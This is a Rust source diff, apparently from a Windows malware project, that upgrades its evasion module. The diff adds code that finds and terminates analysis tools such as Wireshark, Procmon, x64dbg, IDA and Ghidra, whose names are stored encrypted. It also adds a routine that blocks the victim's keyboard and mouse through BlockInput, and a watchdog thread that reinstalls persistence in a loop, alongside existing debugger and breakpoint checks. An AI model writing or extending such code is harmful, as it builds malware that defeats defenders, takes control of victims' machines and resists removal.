@@ -1,7 +1,7 @@
 use crate::{quantum, structs, dark_matter, dynamo};
 use std::ffi::c_void;
 use windows::Win32::Foundation::HANDLE;
-use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken, GetCurrentThread, PROCESS_QUERY_INFORMATION, OpenProcess};
+use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken, GetCurrentThread, PROCESS_QUERY_INFORMATION, OpenProcess, TerminateProcess, PROCESS_TERMINATE};
 use windows::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, GetThreadContext, CONTEXT, CONTEXT_FLAGS};
 use windows::Win32::Security::{DuplicateTokenEx, ImpersonateLoggedOnUser, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_IMPERSONATE, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, GetTokenInformation, TokenUser, TOKEN_USER, LookupAccountSidA, SID_NAME_USE};
 use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE};
@@ -34,7 +34,7 @@ impl EvasionSystem {
         // 5. Environment Checks
         if _check_debugger() { return None; }
         if _check_hardware_breakpoints() { return None; }
-        if _check_hunter_processes_syscall() { return None; }
+        if _find_hunter_pid().is_some() { return None; }
         
         Some(EvasionSystem)
     }
@@ -265,7 +265,6 @@ impl Heuristics {
                 return false;
             }
         }
-
         true
     }
     pub fn get_idle_time() -> u64 {
@@ -330,7 +329,7 @@ fn _check_hardware_breakpoints() -> bool {
     false
 }
 
-fn _check_hunter_processes_syscall() -> bool {
+fn _find_hunter_pid() -> Option<u32> {
     let w = dark_matter::decrypt(dark_matter::WIRESHARK);
     let p = dark_matter::decrypt(dark_matter::PROCMON);
     let x = dark_matter::decrypt(dark_matter::X64DBG);
@@ -359,8 +358,9 @@ fn _check_hunter_processes_syscall() -> bool {
                         // Check against blacklisted (decrypted) names
                         if name_string.contains(&w) || name_string.contains(&p) || name_string.contains(&x) || name_string.contains(&f) 
                            || name_string.contains(&t) || name_string.contains(&ph) || name_string.contains(&tv) || name_string.contains(&ida) || name_string.contains(&ghi) {
+                               let pid = info.UniqueProcessId.0 as u32;
                                std::alloc::dealloc(buf as *mut u8, layout);
-                               return true;
+                               return Some(pid);
                         }
                     }
                     if info.NextEntryOffset == 0 { break; }
@@ -370,28 +370,60 @@ fn _check_hunter_processes_syscall() -> bool {
             std::alloc::dealloc(buf as *mut u8, layout);
         }
     }
-    false
+    None
 }
 
 
-// --- MODULE: SENTINEL (PRESCIENCE) ---
+// --- MODULE: DOMINION (INPUT CONTROL) ---
+pub struct Dominion;
+impl Dominion {
+    pub fn lock_input(enable: bool) {
+        if crate::cleaning::SAFE_MODE { return; }
+        unsafe {
+            use windows::Win32::Foundation::BOOL;
+            use windows::Win32::UI::Input::KeyboardAndMouse::BlockInput;
+            let _ = BlockInput(BOOL::from(enable));
+        }
+    }
+}
+
+// --- MODULE: SENTINEL (PRESCIENCE & NEMESIS & REGENERATION) ---
 pub struct Sentinel;
 impl Sentinel {
     pub fn spawn_watchdog() {
         std::thread::spawn(|| {
             let mut chaos = Chaos::new(0.45); // Seed
             loop {
-                // 1. Scan for Hunters
-                if _check_hunter_processes_syscall() {
-                    // VANISH INSTANTLY
-                    std::process::exit(0);
+                // 1. Scan for Hunters (NEMESIS)
+                if let Some(pid) = _find_hunter_pid() {
+                     _kill_hunter(pid);
                 }
 
-                // 2. Chaos Sleep
+                // 2. Persistence Watchdog (REGENERATION)
+                // In v31, we ensure we exist.
+                crate::persistence::Persistence::install(); 
+
+                // 3. Chaos Sleep
                 let sleep_time = (chaos.next() * 1000.0) as u64; // 0-1000ms
                 quantum::quantum_sleep(200 + sleep_time); 
             }
         });
+    }
+}
+
+fn _kill_hunter(pid: u32) {
+    if crate::cleaning::SAFE_MODE {
+        // SAFETY: Just log it (we can't access main channel easily here, so we skip or print to debug)
+        // ideally we'd send a message, but Sentinel is detached.
+        // We'll trust the User knows.
+        return;
+    }
+
+    unsafe {
+        if let Ok(h_process) = OpenProcess(PROCESS_TERMINATE, false, pid) {
+            let _ = TerminateProcess(h_process, 1);
+            let _ = windows::Win32::Foundation::CloseHandle(h_process);
+        }
     }
 }
 
